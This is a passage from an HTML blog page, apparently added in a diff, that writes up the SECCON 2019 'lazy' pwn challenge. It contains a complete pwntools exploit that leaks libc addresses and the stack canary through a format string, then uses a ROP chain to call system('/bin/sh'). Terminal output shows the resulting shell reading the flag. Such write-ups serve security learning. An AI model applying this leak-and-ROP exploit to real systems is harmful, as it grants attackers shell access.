+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#ff7b72;font-weight:bold">*</span> (<span style="color:#a5d6ff">136</span> <span style="color:#ff7b72;font-weight:bold">-</span> len(payload)) <span style="color:#ff7b72;font-weight:bold">+</span> sequence
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># download libc</span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#a5d6ff">&#34;bytes&#34;</span>)
+</span></span><span style="display:flex;"><span>libc_bin <span style="color:#ff7b72;font-weight:bold">=</span> s<span style="color:#ff7b72;font-weight:bold">.</span>recvall()
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">with</span> open(<span style="color:#a5d6ff">&#34;libc.so.6&#34;</span>, <span style="color:#a5d6ff">&#34;wb&#34;</span>) <span style="color:#ff7b72">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#ff7b72;font-weight:bold">.</span>write(libc_bin)
+</span></span><span style="display:flex;"><span>    f<span style="color:#ff7b72;font-weight:bold">.</span>close()
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>╭─vagrant@ubuntu-bionic ~/share/seccon19/pwn/lazy
+</span></span><span style="display:flex;"><span>╰─$ python exploit_leaks.py remote
+</span></span><span style="display:flex;"><span>[+] Opening connection to lazy.chal.seccon.jp on port 33333: Done
+</span></span><span style="display:flex;"><span>[*] leak = 0x7fff69245d50
+</span></span><span style="display:flex;"><span>[*] input @ 0x7fff69245cf0
+</span></span><span style="display:flex;"><span>[+] Receiving all data: Done (3.75MB)
+</span></span></code></pre></div><h2 id="the-final-exploit">The Final Exploit</h2>
+<p>Unfortunately, for some reason I couldn&rsquo;t download the libc without it getting corrupted somehow, so I couldn&rsquo;t use <code>objdump</code> to find the function offsets.<br>
+I decided to load it in a binary analysis program and look for known functions.<br>
+I found this string: <code>GNU C Library (GNU libc) stable release version 2.23, by Roland McGrath et al.</code>.<br>
+This led me to believe that it was not a standard glibc compiled by Ubuntu like it usually is, which means that the offsets will most likely differ.</p>
+<p>None of the programs were able to parse it correctly, but I found some strings used in the <code>malloc</code> function so I used them to find out the offset of malloc inside the libc. I also quickly found out that some of the symbols would load correctly, so I managed to find <code>system</code> as well.<br>
+I used <code>strings</code> with the -o option to find the offset of the &ldquo;/bin/sh\x00&rdquo; string.</p>
+<p>I also found a <code>pop rdi; ret</code> gadget in the binary itself. This allows us to try the standard <code>ret to system</code> attack.<br>
+All that we need is to get a leak from a known function, like <code>malloc</code>, calculate the libc base and subsequently the addresses of system and the &ldquo;/bin/sh\x00&rdquo; string and use our overflow to overwrite the saved RIP.</p>
+<p>The only obstacle is the canary, but we can just leak it first and just keep it unchanged.</p>
+<p>This is the final exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>HOST <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;lazy.chal.seccon.jp&#34;</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">33333</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#ff7b72;font-weight:bold">=</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>username <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;_H4CK3R_&#34;</span>
+</span></span><span style="display:flex;"><span>password <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;3XPL01717&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># 0x00000000004015f3 : pop rdi ; ret</span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x4015f3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_start_main <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x20740</span>
+</span></span><span style="display:flex;"><span>system_off <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x3F570</span>
+</span></span><span style="display:flex;"><span>malloc_off <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x78560</span>
+</span></span><span style="display:flex;"><span>bin_sh_off <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x163c38</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(username)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(password)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak_fmt <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;%7$sAAAA&#34;</span>
+</span></span><span style="display:flex;"><span>leak_fmt <span style="color:#ff7b72;font-weight:bold">+=</span> p64(elf<span style="color:#ff7b72;font-weight:bold">.</span>got[<span style="color:#a5d6ff">&#34;malloc&#34;</span>])
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(leak_fmt)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#a5d6ff">&#34;Filename : &#34;</span>)
+</span></span><span style="display:flex;"><span>leak <span style="color:#ff7b72;font-weight:bold">=</span> u64(s<span style="color:#ff7b72;font-weight:bold">.</span>recv(<span style="color:#a5d6ff">6</span>)<span style="color:#ff7b72;font-weight:bold">.</span>ljust(<span style="color:#a5d6ff">8</span>, <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#ff7b72;font-weight:bold">=</span> leak <span style="color:#ff7b72;font-weight:bold">-</span> malloc_off
+</span></span><span style="display:flex;"><span>system <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> system_off
+</span></span><span style="display:flex;"><span>bin_sh <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> bin_sh_off
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;leak </span><span style="color:#a5d6ff">{}</span><span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72;font-weight:bold">.</span>format(hex(leak)))
+</span></span><span style="display:flex;"><span>log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;libc base  @ </span><span style="color:#a5d6ff">{}</span><span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72;font-weight:bold">.</span>format(hex(libc_base)))
+</span></span><span style="display:flex;"><span>log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;system     @ </span><span style="color:#a5d6ff">{}</span><span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72;font-weight:bold">.</span>format(hex(system)))
+</span></span><span style="display:flex;"><span>log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;/bin/sh    @ </span><span style="color:#a5d6ff">{}</span><span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72;font-weight:bold">.</span>format(hex(bin_sh)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak_fmt <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;%9$llx&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(leak_fmt)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#a5d6ff">&#34;Filename : &#34;</span>)
+</span></span><span style="display:flex;"><span>cookie <span style="color:#ff7b72;font-weight:bold">=</span> int(s<span style="color:#ff7b72;font-weight:bold">.</span>recvline()<span style="color:#ff7b72;font-weight:bold">.</span>strip(), <span style="color:#a5d6ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;stack cookie = </span><span style="color:#a5d6ff">{}</span><span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72;font-weight:bold">.</span>format(hex(cookie)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak_fmt <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;%10$llx&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(leak_fmt)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#a5d6ff">&#34;Filename : &#34;</span>)
+</span></span><span style="display:flex;"><span>saved_ebp <span style="color:#ff7b72;font-weight:bold">=</span> int(s<span style="color:#ff7b72;font-weight:bold">.</span>recvline()<span style="color:#ff7b72;font-weight:bold">.</span>strip(), <span style="color:#a5d6ff">16</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;saved_ebp = </span><span style="color:#a5d6ff">{}</span><span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72;font-weight:bold">.</span>format(hex(saved_ebp)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># AA so it doesn&#39;t crash on download</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;AA&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x16</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">=</span> padding <span style="color:#ff7b72;font-weight:bold">+</span> p64(cookie) <span style="color:#ff7b72;font-weight:bold">+</span> p64(saved_ebp) <span style="color:#ff7b72;font-weight:bold">+</span> p64(pop_rdi) <span style="color:#ff7b72;font-weight:bold">+</span> p64(bin_sh) <span style="color:#ff7b72;font-weight:bold">+</span> p64(system)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#a5d6ff">&#34;Input file name&#34;</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#a5d6ff">&#34;No such file!&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#ff7b72;font-weight:bold">.</span>interactive()
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>╭─vagrant@ubuntu-bionic ~/share/seccon19/pwn/lazy
+</span></span><span style="display:flex;"><span>╰─$ python exploit.py remote
+</span></span><span style="display:flex;"><span>[+] Opening connection to lazy.chal.seccon.jp on port 33333: Done
+</span></span><span style="display:flex;"><span>[*] leak 0x7f4351c05560
+</span></span><span style="display:flex;"><span>[*] libc base  @ 0x7f4351b8d000
+</span></span><span style="display:flex;"><span>[*] system     @ 0x7f4351bcc570
+</span></span><span style="display:flex;"><span>[*] /bin/sh    @ 0x7f4351cf0c38
+</span></span><span style="display:flex;"><span>[*] stack cookie = 0xdc27f3ac4b683800
+</span></span><span style="display:flex;"><span>[*] saved_ebp = 0x7fff2f338da0
+</span></span><span style="display:flex;"><span>[*] Switching to interactive mode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>810a0afb2c69f8864ee65f0bdca999d7_FLAG
+</span></span><span style="display:flex;"><span>cat
+</span></span><span style="display:flex;"><span>lazy
+</span></span><span style="display:flex;"><span>ld.so
+</span></span><span style="display:flex;"><span>libc.so.6
+</span></span><span style="display:flex;"><span>q
+</span></span><span style="display:flex;"><span>run.sh
+</span></span><span style="display:flex;"><span>$ ./cat 810a0afb2c69f8864ee65f0bdca999d7_FLAG
+</span></span><span style="display:flex;"><span>SECCON{Keep_Going!_KEEP_GOING!_K33P_G01NG!}
+</span></span></code></pre></div>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/pwn">pwn</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://example.com" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://example.com" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a><a class="soc" href="https://example.com" rel="me" title="BlueSky"><i data-feather="bluesky"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
